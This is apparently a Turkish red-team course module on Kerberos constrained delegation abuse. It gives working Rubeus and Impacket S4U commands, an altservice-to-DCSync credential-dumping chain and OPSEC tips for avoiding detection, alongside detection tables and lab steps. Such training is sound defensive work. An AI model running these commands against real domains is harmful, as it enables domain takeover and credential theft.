## 1. Kavramsal Temel — Neden Var?

Unconstrained "her yere" derken tehlikeliydi; Microsoft bunu sınırlamak için **constrained (kısıtlanmış) delegation** getirdi: bir hesap yalnızca **belirli servislere** (`msDS-AllowedToDelegateTo` listesi) kullanıcı adına gidebilir. Ama bu "sınır" bir güvenlik sınırı değildir:

> **Constrained delegation'lı bir hesabın kimliğini (parola/hash) ele geçirirsen, Kerberos'un S4U (Service for User) uzantılarıyla, izin verilen servislere KENDİN gibi değil, İSTEDİĞİN herhangi bir kullanıcı (Domain Admin dahil) gibi bilet üretebilirsin. Kısıtlama "hangi servise" gider ama "kim adına" gittiğini yeterince kısıtlamaz — protokol geçişi (protocol transition) bunu delik yapar.**

Kilit kavram **S4U2Self** (kendi adına, herhangi bir kullanıcı için bilet üret) + **S4U2Proxy** (o bileti izin verilen servise ilet). İkisi zincirlenince: "svc-web hesabıyla, administrator kimliğinde, CIFS/sql01 bileti" üretirsin.

**Analoji:** Sana "sadece 3. kattaki depoya, müşteriler adına gidebilirsin" izni verilmiş. Ama protocol transition sayesinde, hiç görmediğin bir müşteri (CEO) adına bile depo anahtarı üretebiliyorsun — üstelik CEO'nun onayını almadan.

## 2. Teknik Derinlik — S4U2Self / S4U2Proxy Paket Akışı

### 2.1 İki S4U uzantısı

```
   S4U2Self  (MS-SFU 3.1):  "Bir kullanıcı bana (servise) parola İLE gelmiş gibi,
                             o kullanıcı adına KENDİME bir ST üret."
                             → protocol transition: kullanıcı hiç Kerberos kullanmasa bile
   S4U2Proxy (MS-SFU 3.2):  "Elimdeki (S4U2Self ile aldığım) kullanıcı ST'sini kullanarak,
                             msDS-AllowedToDelegateTo'daki hedef servise ST iste."
```

### 2.2 Tam akış — svc-web (constrained → CIFS/SQL01) örneği

```
   Saldırgan (svc-web hash'i elimde)                    KDC
     │ 1) TGS-REQ (S4U2Self): "administrator adına svc-web için ST"│
     │──────────────────────────────────────────────────────────▶│
     │    ST#1 (administrator → svc-web, FORWARDABLE)             │
     │◀──────────────────────────────────────────────────────────│
     │ 2) TGS-REQ (S4U2Proxy): ST#1 + "CIFS/SQL01 hedefi"         │
     │──────────────────────────────────────────────────────────▶│
     │    ST#2 (administrator → CIFS/SQL01)                        │
     │◀──────────────────────────────────────────────────────────│
     │ 3) ST#2 ile SQL01'e administrator olarak eriş → C$ / komut  │
```

> **"Forwardable" kritiği:** S4U2Proxy'nin çalışması için S4U2Self'in ürettiği ST#1'in **forwardable** olması gerekir. Eğer hedef kullanıcı "sensitive, cannot be delegated" ise veya Protected Users'daysa, ST#1 forwardable olmaz → S4U2Proxy başarısız. **Bronze Bit (CVE-2020-17049, [06.4](./06.4_Bronze_Bit.md))** tam da bu forwardable kontrolünü kırar.

### 2.3 "AltService" hilesi — hangi servise gerçekten gidebilirsin?

`msDS-AllowedToDelegateTo` `CIFS/SQL01` içeriyorsa, aslında **aynı host için başka servis sınıflarına** da bilet üretebilirsin (Rubeus `/altservice:HOST,HTTP,LDAP...`). Çünkü Kerberos ST doğrulamasında servis sınıfı (SPN'in ilk kısmı) sıkı kontrol edilmez — sadece hostname eşleşir. Yani `CIFS/SQL01` izni pratikte `HOST/SQL01` (WMI/PSExec), `HTTP/SQL01`, `LDAP/SQL01` (DCSync eğer DC'yse!) anlamına gelebilir.

## 3. Pratik Uygulama — Çok Araçlı

### 3.1 Constrained delegation'lı hesapları bul

```powershell
Get-DomainUser -TrustedToAuth | Select samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select samaccountname, msds-allowedtodelegateto
```

```bash
nxc ldap 10.10.10.5 -u jdoe -p 'Welcome1' --find-delegation
```

### 3.2 Rubeus s4u (Windows) — tam zincir

```
:: svc-web hash'i ile administrator adına CIFS/SQL01 bileti üret ve enjekte et
Rubeus.exe s4u /user:svc-web /rc4:<svc-web NThash> /impersonateuser:administrator \
   /msdsspn:CIFS/SQL01.corp.local /altservice:HOST,HTTP,LDAP /ptt
:: /altservice ile aynı host'ta ek servis sınıfları → WMI/PSExec/DCSync kapıları
```

### 3.3 Impacket getST (Linux)

```bash
# S4U2Self + S4U2Proxy tek komut
impacket-getST -spn CIFS/SQL01.corp.local -impersonate administrator \
  -hashes :<svc-web NThash> corp.local/svc-web -dc-ip 10.10.10.5
export KRB5CCNAME=administrator@CIFS_SQL01.ccache
impacket-psexec -k -no-pass corp.local/administrator@SQL01.corp.local
```

**Örnek çıktı (getST):**
```
[*] Getting TGT for user
[*] Impersonating administrator
[*]  Requesting S4U2self
[*]  Requesting S4U2Proxy
[*] Saving ticket in administrator@CIFS_SQL01.corp.local.ccache   ← admin olarak SQL01
```

### 3.3.1 Manuel iki-adım (S4U2Self ve S4U2Proxy ayrı)

```
:: Bazen ayrı adımlar gerekir (hata ayıklama / etype kontrolü)
Rubeus.exe s4u /user:svc-web /rc4:<hash> /impersonateuser:administrator /self /nowrap
::  → ST#1 (S4U2Self) base64
Rubeus.exe s4u /user:svc-web /rc4:<hash> /tgs:<ST#1> /msdsspn:CIFS/SQL01.corp.local /ptt
::  → ST#2 (S4U2Proxy) enjekte
```

### 3.4 DC hedefli özel durum (LDAP → DCSync)

```bash
# Hedef bir DC ise ve altservice LDAP üretebiliyorsa → o TGS ile DCSync
impacket-getST -spn LDAP/DC01.corp.local -impersonate administrator -hashes :<hash> corp.local/svc-web
KRB5CCNAME=administrator@LDAP_DC01.ccache impacket-secretsdump -k -no-pass @DC01.corp.local -just-dc
```

## 4. Bıraktığı İz ve Karşı Tespit

| Teknik | MITRE ATT&CK | Bıraktığı iz (IOC) | Karşı Blue tespiti |
|--------|--------------|--------------------|--------------------|
| S4U2Self/Proxy abuse | **T1558.003** / T1550.003 | **4769** çift TGS (S4U2Self + S4U2Proxy), `Transited Services` alanı dolu | [Blue 06.4](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.4_Kerberos_Anomali_Izleme.md) |
| Impersonate yüksek-değerli kullanıcı | T1078 | 4769'da beklenmedik `administrator` impersonation | [Blue 06.1](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.1_Delegation_Envanteri_ve_Temizligi.md) |
| altservice ile DCSync | T1003.006 | 4662 DS-Replication + delegation kaynaklı ST | [Blue 10.3](../../2-Blue_Team/Modul_10_Olay_Mudahalesi_DFIR_ve_Kurtarma/10.3_NTDS_Adli_Analiz_ve_Timeline.md) |

**OPSEC notları:**
- **4769'daki `Transited Services` alanı** S4U kullanımının parmak izidir — normal kullanıcı oturumlarında boştur, S4U2Proxy'de dolar ([Blue 06.4](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.4_Kerberos_Anomali_Izleme.md)). Ayrıca kısa sürede aynı hesaptan iki ardışık 4769 (Self+Proxy) desen üretir.
- **"administrator" impersonate etmek** en gürültülü seçimdir; delegation'ın gerçek amacına uygun, daha az dikkat çeken bir kullanıcı (ör. o servisi zaten kullanan bir hesap) seçersen doğal görünürsün — ama hedefin admin olması gerekiyorsa risk kaçınılmaz.
- **Sensitive/Protected Users hedefleri** S4U2Self'te forwardable bilet vermez → zincir kırılır. Bu durumda [Bronze Bit](./06.4_Bronze_Bit.md) (yamasızsa) veya başka yol gerekir.
- **altservice** LDAP üretimini yalnızca hedef DC ise dene; gereksiz servis sınıfı denemeleri ekstra 4769 gürültüsüdür.

## 5. Doğrulama / Lab

```bash
# 1) Lab: svc-web'e constrained delegation ver (msDS-AllowedToDelegateTo = CIFS/SQL01)
Set-ADUser svc-web -Add @{'msDS-AllowedToDelegateTo'='CIFS/SQL01.corp.local'}   # + protocol transition
# 2) getST ile administrator adına CIFS/SQL01 bileti üret, psexec ile SQL01'e bağlan
impacket-getST -spn CIFS/SQL01.corp.local -impersonate administrator -hashes :<hash> corp.local/svc-web
# 3) Blue: 4769'da Transited Services dolu ardışık iki olayı yakala
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4769} | ? Message -match 'Transited'
# 4) administrator'ı "sensitive, cannot be delegated" yap → S4U2Proxy başarısız olmalı (Bronze Bit hariç)
```

Atomic Red Team: **T1558.003** (delegation) → Blue doğrulaması [Blue 06.4](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.4_Kerberos_Anomali_Izleme.md).

### Gerçek-dünya S4U zinciri (altservice ile DCSync'e)

```
   1) 01.3: Get-DomainComputer -TrustedToAuth → WEB01$, msDS-AllowedToDelegateTo=CIFS/DC01
   2) WEB01$ hash'i al (04.x makine hesabı ele geçirme / RBCD / Shadow Cred 05.4)
   3) getST -spn CIFS/DC01 -impersonate administrator -hashes :<WEB01$>  (S4U zinciri)
   4) altservice hilesi: aynı biletle LDAP/DC01 → DCSync yetkisi
      getST -spn LDAP/DC01 -impersonate administrator -altservice LDAP ...
   5) secretsdump -k -just-dc → krbtgt → Golden Ticket (Modül 09)
   "CIFS/DC01" izni, altservice ile "LDAP/DC01"e (DCSync) dönüştü.
```

### Ek: constrained delegation türleri (with/without protocol transition)

```
   "Kerberos only" (TRUSTED_TO_AUTH_FOR_DELEGATION KAPALI):
     S4U2Self forwardable bilet vermez → yalnızca gerçekten Kerberos ile gelen kullanıcı
     delege edilir. Saldırgan keyfi kullanıcı impersonate EDEMEZ (Bronze Bit hariç, 06.4).
   "Any authentication / protocol transition" (TRUSTED_TO_AUTH_FOR_DELEGATION AÇIK):
     S4U2Self forwardable verir → keyfi kullanıcı impersonate mümkün. Asıl tehlikeli olan bu.
   → Keşifte userAccountControl'de bu biti kontrol et; abuse edilebilirliği belirler.
```
